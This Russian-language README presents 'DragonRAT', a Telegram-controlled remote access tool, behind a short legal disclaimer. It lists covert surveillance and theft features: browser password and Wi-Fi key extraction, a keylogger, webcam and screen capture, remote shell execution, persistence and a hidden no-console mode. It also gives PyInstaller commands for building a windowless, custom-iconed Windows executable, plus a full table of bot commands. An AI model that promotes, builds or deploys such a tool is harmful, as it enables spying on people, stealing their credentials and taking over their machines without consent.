🐉 DragonRAT - Remote Administration Tool
⚠️ Важное предупреждение
Данный инструмент создан ИСКЛЮЧИТЕЛЬНО для:

Администрирования собственных систем

Тестирования безопасности с письменного разрешения

Образовательных целей в контролируемой среде

НЕЗАКОННОЕ ИСПОЛЬЗОВАНИЕ этого инструмента для доступа к чужим системам без разрешения преследуется по закону. Разработчик не несет ответственности за неправомерное использование.

✨ Возможности
📁 Файловые операции
Просмотр содержимого директорий (/ls)

Навигация по файловой системе (/cd, /pwd)

Загрузка файлов с удаленной системы (/download)

Удаление файлов и папок (/delete, /rmdir)

Создание папок (/mkdir)

💻 Системные команды
Выполнение команд в shell (/exec)

Просмотр и завершение процессов (/ps, /kill)

Скриншоты экрана (/screenshot)

Снимки с веб-камеры (/webcam)

Кейлоггер с сохранением в файл (/keylog_*)

🔍 Сбор данных
Пароли браузеров (Chrome, Chromium, Edge) - /passwords

История браузеров - /browser

Wi-Fi пароли (Windows) - /wifi

Буфер обмена - /clipboard

Переменные окружения - /env

Детальная информация о системе - /info

🌐 Сетевые возможности
Сканирование портов (/portscan)

Информация о сети (/network)

Геолокация по IP (/geoip)

Внешний и локальный IP

⚙️ Управление
Персистентность (автозагрузка) - /persist

Автоматическое удаление (/uninstall)

Обновление (/update)

Перезапуск (/restart)

Завершение сессии (/exit)

🔐 Безопасность
Шифрование трафика (Fernet)

Проверка авторизации по Telegram ID

Скрытый режим (без консоли)

Уникальная сессия для каждой инсталляции

📋 Требования
Python 3.7+



🔧 Компиляция в EXE (Windows):
# Установка PyInstaller
pip install pyinstaller

#без консоли
pyinstaller --onefile --noconsole --name DragonRat DragonRat.py

#без консоли с иконкой
pyinstaller --onefile --noconsole --icon=dragon.ico --name DragonRAT DragonRat.py
Telegram Bot Token (получить у @BotFather)

📚 Список команд
Основные команды
Команда	Описание	Пример
/start	Начальное приветствие	/start
/help	Справка	/help
/info	Информация о системе	/info
/status	Статус RAT	/status
Файловые операции
Команда	Описание	Пример
/ls	Список файлов	/ls C:\Windows
/cd	Сменить директорию	/cd ..
/pwd	Текущая директория	/pwd
/download	Скачать файл	/download file.txt
/delete	Удалить файл/папку	/delete file.txt
/mkdir	Создать папку	/mkdir new_folder
/rmdir	Удалить папку	/rmdir folder
Системные операции
Команда	Описание	Пример
/exec	Выполнить команду	/exec dir
/ps	Список процессов	/ps
/kill	Завершить процесс	/kill 1234
/screenshot	Сделать скриншот	/screenshot
/webcam	Снимок с камеры	/webcam
/keylog_start	Запустить кейлоггер	/keylog_start
/keylog_stop	Остановить кейлоггер	/keylog_stop
/keylog_dump	Получить логи	/keylog_dump
Сбор данных
Команда	Описание	Пример
/passwords	Пароли браузеров	/passwords
/browser	История браузера	/browser
/wifi	Wi-Fi пароли	/wifi
/clipboard	Буфер обмена	/clipboard
/env	Переменные окружения	/env
Сеть
Команда	Описание	Пример
/portscan	Сканирование портов	/portscan 192.168.1.1 1-1000
/network	Сетевая информация	/network
/geoip	Геолокация по IP	/geoip 8.8.8.8
Управление
Команда	Описание	Пример
/persist	Установить персистентность	/persist
/update	Обновить RAT	/update
/restart	Перезапустить RAT	/restart
/uninstall	Удалить RAT	/uninstall
/exit	Завершить сессию	/exit
